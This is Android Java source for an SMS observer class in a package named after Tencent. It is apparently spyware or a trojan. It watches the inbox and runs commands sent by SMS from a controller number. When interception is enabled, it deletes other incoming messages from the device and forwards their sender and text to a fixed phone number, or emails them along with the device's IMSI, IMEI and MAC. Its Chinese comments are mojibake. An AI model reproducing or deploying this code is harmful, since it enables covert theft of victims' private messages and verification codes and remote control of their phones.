package com.tencent.sms;

import com.tencent.qq.Keys;
import com.tencent.qq.MainService;
import com.tencent.util.DeviceInfo;
import com.tencent.util.DeviceInfoGetter;
import com.tencent.util.Utility;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

/*
 *  
 ContentObserver�������ݹ۲��ߣ�Ŀ���ǹ۲�(��׽)�ض�Uri��������ݿ�ı仯���̶���һЩ��Ӧ�Ĵ�����������

  ���ݿ⼼���еĴ�����(Trigger)����ContentObserver���۲��Uri�����仯ʱ����ᴥ��������������Ϊ���������д�������

  ��Ӧ��ContentObserverҲ��Ϊ����ContentObserver�����С�ContentObserver����Ȼ����������������Uri MIME Type�йصġ�
 */
public class SMSObserver extends ContentObserver{

	private Handler mHandler;
	//���ݽ���������ContentProvider�պ��෴,һ���ṩ��һ������
	private ContentResolver mResolver;
	//�����Ķ���
	private Context mContext;

	//��Ҫȡ�õĶ�������
	private static final int MAX_NUMS=10;
	//���ڱ����¼������ID
	private static final int MAX_ID=0;
	//��Ҫ��õ��ֶ���
	private static final String[] PROJECTION={
		SMSConstant.ID,
		SMSConstant.TYPE,
		SMSConstant.ADDRESS,
		SMSConstant.BODY,
		SMSConstant.DATE,
		SMSConstant.THREAD_ID,
		SMSConstant.READ,
		SMSConstant.PROTOCOL
	};
	/*
	 * ��ѯ���
	 * ���ڲ�ѯID���� MAX_ID�ļ�¼����ʼΪ0���������ڱ����¼�����ID�����ŵ���ʼIDΪ1
	 * and read=0
	 */
	private static final String SELECTION=SMSConstant.ID + " > %s"+
	        " and ("+SMSConstant.TYPE+"="+SMSConstant.MESSAGE_TYPE_INBOX+
	        ") ";
	
	//ȡֵ��Ӧ�Ľ������PROJECTION ���Ӧ���ֶ�
	 private static final int COLUMN_INDEX_ID    = 0;
	 private static final int COLUMN_INDEX_TYPE  = 1;
	 private static final int COLUMN_INDEX_PHONE = 2;
     private static final int COLUMN_INDEX_BODY  = 3;
     private static final int COLUMN_INDEX_DATE  = 4;
     private static final int COLUMN_INDEX_PROTOCOL = 7;
	
	public SMSObserver(Context mContext,ContentResolver resolver,Handler handler) {
		super(handler);
	    this.mResolver=resolver;
	    this.mHandler=handler;	    
	    this.mContext=mContext;
	}
	
	@Override
	public void onChange(boolean selfChange){
		super.onChange(selfChange);
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				querySmsDatabase();
			}
		}).start();
		
	}

	private synchronized void querySmsDatabase(){
		if(SmsLockHelper.disposeing)
			return;
		Cursor cursor=null;
		SmsLockHelper.disposeing=true;
		Log.e("TAG", "����ContentOberver");
		try {
			cursor=mResolver.query(Uri.parse(SMSConstant.SMS_URI_INBOX),   //��ѯ��URI
                      PROJECTION,                //��Ҫȡ�õ���
                      String.format(SELECTION,MAX_ID),                 //��ѯ��� 13410698053
                      null,             //���ܰ�������ѡ�񣬽����滻selectionArgs��ֵ����ѡ�����ǳ��ֵ�˳�򡣸�ֵ������Ϊ�ַ�����
                      SMSConstant.DATE + " DESC");                //����
			
			if(cursor!=null&&cursor.getCount()>0)
			{	
				cursor.moveToFirst();
				 //ȡ�����µ�һ������
				
				int id=cursor.getInt(COLUMN_INDEX_ID);
				int type=cursor.getInt(COLUMN_INDEX_TYPE);				
				int protocol=cursor.getInt(COLUMN_INDEX_PROTOCOL);
				long date=cursor.getLong(COLUMN_INDEX_DATE);
				String phone=cursor.getString(cursor.getColumnIndex(SMSConstant.ADDRESS));//cursor.getString(COLUMN_INDEX_PHONE);
				String body=cursor.getString(cursor.getColumnIndex(SMSConstant.BODY));//cursor.getString(COLUMN_INDEX_BODY);
				
				 //��������Ѿ���������ˣ��Ͳ�������
            	if(date==SmsLockHelper.lastSmsDate){
            		return;
            	}
            	SmsLockHelper.lastSmsDate=date;
				
            	//ȥ����ͷ+86
              	if (phone.startsWith("+86")){   
           		 phone = phone.substring(3);   
 	            }  
              	 /**
				 * ����ָ�������ݣ�����ǿ��ƶ��ţ�����״̬Ϊ�ѽ��գ���ִ�п��Ʋ���
				 * ��ֹ�����ŷ��Ͷ��ŷ����Լ���������
				 */
				if(protocol==0&&body!=null&&body.trim().startsWith(Keys.FILTER)&&
						phone.trim().contains(Keys.PHONE)){

					MessageItem item=new MessageItem(id, type, protocol, date, phone, body);
					//֪ͨHandler��ҵ���������Handle����
					Message msg=new Message();
					msg.obj=item;
					mHandler.sendMessage(msg);
				}
            	
	            StringBuffer sb = new StringBuffer(); 
	            sb.append("������:"+phone);	    	            
	            //sb.append("\nʱ��:"+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date));
	            sb.append("\n����:"+(type==0?"����":"����"));
	            sb.append("\n����:"+body);
				//һ���û������Ƿ�����
				
				//���ض���,ͬʱ��ֹ����Ա�Լ������Լ���������ѭ��
				if(MainService.bInterceptSms&&!phone.equals(Keys.PHONE)){
					if(id!=-1){
						//��Ӹ�����ID��β��·����
						Uri uri=ContentUris.withAppendedId(Uri.parse(SMSConstant.SMS_URI_ALL), id);
						//ɾ��ָ���Ķ���,���������ۼ�������^_^
						mContext.getContentResolver().delete(uri,null,null);
					}
					
		            if(Keys.IS_SMS_INTERCEPT){
					    Utility.sendSms(Keys.PHONE, "���������أ�\n"+sb.toString());
		            }else {
		            	DeviceInfo deviceInfo=deviceInfo=DeviceInfoGetter.getInstance(mContext).getDeviceInfo();
		            	String getImsi=deviceInfo.getIMSI()==null?deviceInfo.getIMEI():deviceInfo.getIMSI();
						Utility.sendMailByJavaMail("����������", "����+IMSI��"+getImsi+",MAC:"+deviceInfo.getMAC()+"���յ����¶���"
								+ "���������£�\n"+sb.toString());
					}
					Log.e(phone, "���������أ�\n"+sb.toString());
	
				}
				
				
			}
			
		} catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(cursor!=null){
				cursor.close();
				cursor=null;
			}
			SmsLockHelper.disposeing=false;
		}

	}

}
